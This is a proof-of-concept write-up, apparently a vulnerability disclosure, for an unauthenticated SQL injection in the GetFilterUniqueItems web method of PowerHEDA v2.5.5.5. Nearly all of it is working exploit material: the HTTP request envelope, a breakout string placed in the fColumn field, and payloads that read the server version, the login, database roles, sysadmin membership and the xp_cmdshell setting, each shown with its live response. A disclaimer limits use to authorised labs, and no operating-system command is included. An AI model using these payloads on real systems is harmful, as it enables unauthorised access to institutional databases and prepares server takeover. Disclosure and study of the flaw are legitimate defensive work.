# Proof of Concept — Unauthenticated SQL Injection in PowerHEDA v2.5.5.5

Reproduce only on a lab instance or a host you are authorised to test. Do not run these requests against third-party universities.

The customer hostname is withheld. Use `Host: <powerheda-host>`. Every request below is the same JSON envelope; only `fColumn` changes. **No `Cookie` header.**

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
Content-Type: application/json; charset=utf-8
Accept: application/json
```

The method concatenates `fColumn` as a T-SQL identifier. The working breakout is:

```text
x] FROM (SELECT <expression> AS [x]) t --
```

`sysadmin` / `xp_cmdshell` values below are this install’s SQL configuration. They are not required for the product bug. No operating-system command is included.

---

## 1. Identifier concatenation (not a column)

**Request body**

```json
{"fColumn":"1","fKey":"5","fWhere":""}
```

**Response:** HTTP `500`

```json
{"Message":"Invalid column name '1'.","StackTrace":"   at heda_be.Data.db.GetData(String commandText, Dictionary`2 parameters, CommandType commandType) in C:\\Dev\\Projects\\PowerHEDA\\heda_be\\Data\\db.vb:line 201\r\n   at PowerHEDA.QueryBuilderDataRetrieval.GetFilterUniqueItems(String fColumn, String fKey, String fWhere) in C:\\Dev\\Projects\\PowerHEDA V255\\PowerHEDA\\webservices\\HedaDataRetrieval.asmx.vb:line 600","ExceptionType":"System.Data.SqlClient.SqlException"}
```

---

## 2. SQL execution — `@@VERSION`

**Request body**

```json
{"fColumn":"x] FROM (SELECT @@VERSION AS [x]) t --","fKey":"5","fWhere":""}
```

**Response:** HTTP `200`

```json
{"d":["Microsoft SQL Server 2017 (RTM-GDR) (KB5063760) - 14.0.2080.1 (X64) \n\tJul 14 2025 12:59:30 \n\tCopyright (C) 2017 Microsoft Corporation\n\tEnterprise Edition: Core-based Licensing (64-bit) on Windows Server 2012 R2 Standard 6.3 <X64> (Build 9600: ) (Hypervisor)\n"]}
```

---

## 3. Additional identity payloads (same envelope)

Each of these is HTTP `200`. Repeat **without** a `Cookie` header; the body is unchanged.

### `SYSTEM_USER`

```json
{"fColumn":"x] FROM (SELECT SYSTEM_USER AS [x]) t --","fKey":"5","fWhere":""}
```

```json
{"d":["hedauser"]}
```

### `USER_NAME()`

```json
{"fColumn":"x] FROM (SELECT USER_NAME() AS [x]) t --","fKey":"5","fWhere":""}
```

```json
{"d":["dbo"]}
```

### `DB_NAME()`

```json
{"fColumn":"x] FROM (SELECT DB_NAME() AS [x]) t --","fKey":"5","fWhere":""}
```

```json
{"d":["PowerHEDA"]}
```

### `IS_SRVROLEMEMBER('sysadmin')`

```json
{"fColumn":"x] FROM (SELECT CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar(10)) AS [x]) t --","fKey":"5","fWhere":""}
```

```json
{"d":["1"]}
```

### `IS_MEMBER('db_owner')`

```json
{"fColumn":"x] FROM (SELECT CAST(IS_MEMBER('db_owner') AS varchar(10)) AS [x]) t --","fKey":"5","fWhere":""}
```

```json
{"d":["1"]}
```

### `xp_cmdshell` configuration (`value_in_use` only)

This reads `sys.configurations`. It does **not** invoke `xp_cmdshell`.

```json
{"fColumn":"x] FROM (SELECT CAST(value_in_use AS varchar(10)) AS [x] FROM sys.configurations WHERE name = 'xp_cmdshell') t --","fKey":"5","fWhere":""}
```

```json
{"d":["1"]}
```

### Combined identity (one request)

```json
{"fColumn":"x] FROM (SELECT SYSTEM_USER + N'|' + USER_NAME() + N'|' + DB_NAME() + N'|' + CAST(IS_SRVROLEMEMBER(N'sysadmin') AS nvarchar(4)) + N'|' + CAST(CAST(value_in_use AS int) AS nvarchar(4)) AS [x] FROM sys.configurations WHERE name = N'xp_cmdshell') t --","fKey":"5","fWhere":""}
```

```json
{"d":["hedauser|dbo|PowerHEDA|1|1"]}
```

(`login | db user | database | sysadmin | xp_cmdshell value_in_use`)
